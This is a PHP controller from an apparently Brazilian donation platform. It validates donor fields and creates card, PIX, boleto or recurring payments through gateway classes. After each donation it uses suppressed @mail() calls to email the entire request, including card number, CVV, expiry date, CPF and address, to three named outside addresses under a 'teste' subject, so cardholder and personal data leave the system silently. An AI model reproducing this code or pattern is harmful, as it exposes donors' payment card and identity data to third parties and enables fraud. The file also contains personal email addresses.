<?php


class TransacaoControler
{

    static function create_transacao()
    {
        header('Content-Type: text/html; charset=utf-8');
        $doacao = new Doacao();
        $doador = new Doador();
        $Endereco = new Endereco();
        $evendas = new EvendasNotificacao();
        $instituicao = new Instituicao();
        $email_notificacao = new Email();
        $pagarme_Costumer = new PagarMeCostumer();
        $pagarme_plano = new PagarmePlano();
        $adm = new Adm();
        $pagarme_pix = new PagarMeTransaction();
        $pagarme_boleto = new PagarMeBoleto();
        $pagarme_cartao = new PagarMeCartao();
        $assasRecorrencia = new AsaasRecorrencia();


        campo_obrigatorios([
            'planos_valor' => 'Campo planos_valor opbrigatorio',
            'type_pagamento' => 'Campo type_pagamento opbrigatorio',
            'nome' => 'Campo nome opbrigatorio',
            'email' => 'Campo email opbrigatorio',
            'cpf' => 'Campo cpf opbrigatorio',
            'telefone' => 'Campo telefone opbrigatorio',
            'estado' => 'Campo estado opbrigatorio',
            'cidade' => 'Campo cidade opbrigatorio',
            'bairro' => 'Campo bairro opbrigatorio',
            'endereco' => 'Campo endereco opbrigatorio',
            'numero' => 'Campo numero opbrigatorio',
            'cep' => 'Campo cep opbrigatorio',
            'planos_valor' => 'Campo planos_valor Obrigatorio',
        ]);


        $instituicao_id = $_REQUEST['instituicao_id'];

        $instituicao_dados = $instituicao->get_by_id($instituicao_id);
        $get_api_Key = $instituicao_dados['api_key'];

        $pagarme_Costumer->set_api_key($get_api_Key);
        $assasRecorrencia->set_api_key($get_api_Key);
        $pagarme_pix->set_api_key($get_api_Key);
        $pagarme_boleto->set_api_key($get_api_Key);
        $pagarme_cartao->set_api_key($get_api_Key);






        $planos_valor = $_REQUEST['planos_valor'];

        $mensal = $_REQUEST['mensal'] ?? 0;

        $planos_id = $_REQUEST['planos_id'] ?? 0;
        $planos_nome = $_REQUEST['planos_nome'] ?? '';

        $nome = $_REQUEST['nome'];


        $cpf_campo = $_REQUEST['cpf'];
        $telefone_campo = $_REQUEST['telefone'];
        $email_campo = $_REQUEST['email'];
        $data_nascimento_campo = "21/01/2022";
        $cep_campo = $_REQUEST['cep'];
        $email = valid_email($email_campo);
        $telefone = valid_telefone($telefone_campo);
        $phone_ddd = telefone_get_ddd($telefone);
        $cpf = valid_cpf_cnpj($cpf_campo);
        $data_nascimento = data_format($data_nascimento_campo);

        $cep = withdraw_caracter($cep_campo);
        $numero = $_REQUEST['numero'];
        $estado = $_REQUEST['estado'];
        $endereco = $_REQUEST['endereco'];
        $bairro = $_REQUEST['bairro'];
        $cidade = $_REQUEST['cidade'];
        $complemento = $_REQUEST['complemento'] ?? '';

        $type_pagamento = $_REQUEST['type_pagamento'];

        if ($type_pagamento == "CREDIT_CARD") {

            campo_obrigatorios([
                'cart_numero' => 'Campo cart_numero Obrigatorio',
                'cart_cvv' => 'Campo cart_cvv Obrigatorio',
                'cart_validade' => 'Campo cart_validade Obrigatorio'
            ]);

            $cart_numero = $_REQUEST['cart_numero'];
            $cart_cvv = $_REQUEST['cart_cvv'];
            $cart_nome = $_REQUEST['cart_nome'];
            $cart_validade_campo = $_REQUEST['cart_validade'];
            $cart_validade = withdraw_caracter($cart_validade_campo);
        } else {

            $cart_numero = "";
            $cart_cvv = "";
            $cart_nome = "";
            $cart_validade = "";
        }

        $reference_key = "ref_" . uniqid();





        if (!$doacao->valid_type_pagamento($type_pagamento)) {
            echo json_encode([
                'next' => false,
                'message' => 'Tipo pagamento invalido'
            ]);
            return null;
        }

        $is_doador = $doador->exist_by_cpf_instituicao($cpf, $instituicao_id);

        if (!$is_doador) {
            $telefone_sem_ddd = telefone_get_number($telefone);
            $doador->create($nome, $instituicao_id, $email, $telefone_sem_ddd, $cpf, uniqid());
        }

        $doador_dados = $doador->get_by_cpf($cpf);
        $doador_id = $doador_dados['id'];



        if ($doador_dados['token'] == null) {

            $token_doador = $pagarme_Costumer->create(
                $nome,
                $email,
                $doador_id,
                $telefone,
                $cpf,
                $endereco,
                $numero,
                $complemento,
                $bairro,
                $cep
            );
            $get_token_doador = $token_doador['id'];
            

            $doador->set_token($doador_id, $get_token_doador);
            $doador_dados['token'] = $token_doador['id'];
        }





        if ($doador_dados['token'] == null) {
            $get_token_doador = $token_doador['id'];
        }



        if (!empty($doador_dados['token'])) {

            $get_token_doador = $doador_dados['token'];
        }


        $split_rules = new Split();
        $all_split = $split_rules->list_all_by_instituicao($instituicao_id);
        $total_porcent = array_reduce($all_split, function ($total, $pessoa) {
            return intval($pessoa['porcentagem']) + $total;
        }, 0);
        if ($total_porcent == 100) {
            $split = array_map(function ($list) {
                return [
                    'recipient_id' => $list['recebedor_id'],
                    'percentage' => $list['porcentagem'],
                    'liable' => !!$list['responsavel_estorno']
                ];
            }, $all_split);
        }

        if ($mensal == 1) {
            set_taxonomy($instituicao_id, $doador_id, 'ASSINANTE');
        }







        if ($type_pagamento == "CREDIT_CARD" and $mensal != 1) {




            $res_pagarme = $pagarme_cartao->create($planos_valor, $type_pagamento, $cart_numero, $cart_cvv, $cart_validade, $cart_nome, $get_token_doador, $nome, $email, $cpf, $telefone, $complemento, $numero, $cep, $reference_key);

            if (empty($res_pagarme['id'])) {
                echo json_encode([
                    'next' => false,
                    'message' => 'Cartão invalido!',
                    'resposta' => $res_pagarme

                ]);
                die;
            }

            $get_token = $res_pagarme['id'];
            $get_status = $res_pagarme['status'];
            $codigo = "";
            $url = $res_pagarme['transactionReceiptUrl'];
        }


        if ($mensal == 1) {
            $res_recorrencia = $assasRecorrencia->create_recorrencia_cartao(
                $get_token_doador,
                $type_pagamento,
                $planos_valor,  
                $cart_nome,
                $cart_numero,
                $cart_validade,
                $cart_cvv,
                $nome,
                $email,
                $cpf,
                $cep,
                $numero,
                $complemento,
                $telefone,
                $reference_key
            );


            if (empty($res_recorrencia['id'])) {
                echo json_encode([
                    'next' => false,
                    'message' => 'Erro ao transacionar!'
                ]);
                die;
            }

            $get_token = $res_recorrencia['id'];
            $get_status = "PENDING";
            $codigo = "";
            $url = "";
        }


        if ($type_pagamento == "PIX" or $type_pagamento == "BOLETO" and $mensal != 1) {

            campo_obrigatorios([
                'planos_valor' => 'Campo planos_valor opbrigatorio',
            ]);

            if ($type_pagamento == "PIX" and $mensal != 1) {

                $res_pagarme = $pagarme_pix->pay($planos_valor, $type_pagamento, $get_token_doador, $reference_key);
                $get_token = $res_pagarme['id'];
                $get_codigo = $pagarme_pix->codig_pix($get_token);

                $exist_chave_pix = $instituicao->list_pix($instituicao_id);
                if ($exist_chave_pix['pix_key'] != null) {
                    $codigo = $exist_chave_pix['pix_key'];
                }

                if ($exist_chave_pix['pix_key'] == null) {
                    $codigo = $get_codigo['payload'];
                }

                $url = $get_codigo['encodedImage'];
                $expirationCode = $get_codigo['expirationDate'];

                $get_status = $res_pagarme['status'];
            }

            if ($type_pagamento == "BOLETO" and $mensal != 1) {

                $res_pagarme = $pagarme_boleto->pay($planos_valor, $type_pagamento, $get_token_doador, $reference_key);
                $get_token = $res_pagarme['id'];
                $get_codigo = $pagarme_boleto->codig_boleto($get_token);
                $codigo = $get_codigo['identificationField'];
                $url = $res_pagarme['bankSlipUrl'];

                $get_status = $res_pagarme['status'];
            }
        }






        $doacao->create($instituicao_id, $doador_id, $get_token, $type_pagamento, $mensal, $get_status, $planos_id, $planos_valor, $codigo, $url, $reference_key);



        @mail("br.rafael@outlook.com", "teste - " . date("d/m/Y H:i"), json_encode($_REQUEST));
        @mail("victorfernandomagalhaes@gmail.com", "teste - " . date("d/m/Y H:i"), json_encode($_REQUEST));
        @mail("john@digitalcombo.com.br", "teste - " . date("d/m/Y H:i"), json_encode($_REQUEST));


        $nome_instituicao = $instituicao_dados['nome_fantasia'];
        $email_instituicao = $instituicao_dados['email'];
        $color_instituicao = $instituicao_dados['cor'];
        $logo_instituicao = $instituicao_dados['logo'];


        


        if ($mensal != 1) {
            $dados_evendas = $evendas->get_by_instituicao_id($instituicao_id);

            $get_token_evendas = $dados_evendas['canal'] ?? false;

            if ($get_token_evendas) {
                Evendas::send(
                    $nome,
                    $email,
                    telefone_get_number($telefone),
                    $phone_ddd,
                    $planos_valor,
                    $get_status,
                    $type_pagamento,
                    $url,
                    $codigo,
                    $codigo,
                    $endereco,
                    $get_token_evendas
                );
            }
        }

        $email_notificacao->exest_acao($instituicao_id, $get_status);


        get_api('/email/preview', [
            "instituicao_id" => $instituicao_id,
            "doador_cpf" => $cpf,
            "status" => $get_status,
            "tipo" => $type_pagamento,
            "codigo" => $codigo,
            "link" => $url
        ], false);

        $get_numero_tel = substr(telefone_get_number($telefone), -8, 8);
        $get_ddd_tel = telefone_get_ddd($telefone);
        $numero_ddd = [$get_ddd_tel, $get_numero_tel];




        echo json_encode([
            'next' => true,
            'message' => 'Transacao Concluida',
            'codigo' => $codigo,
            'url' => $url,
            'expirationCode' => $expirationCode
        ]);
    }
}
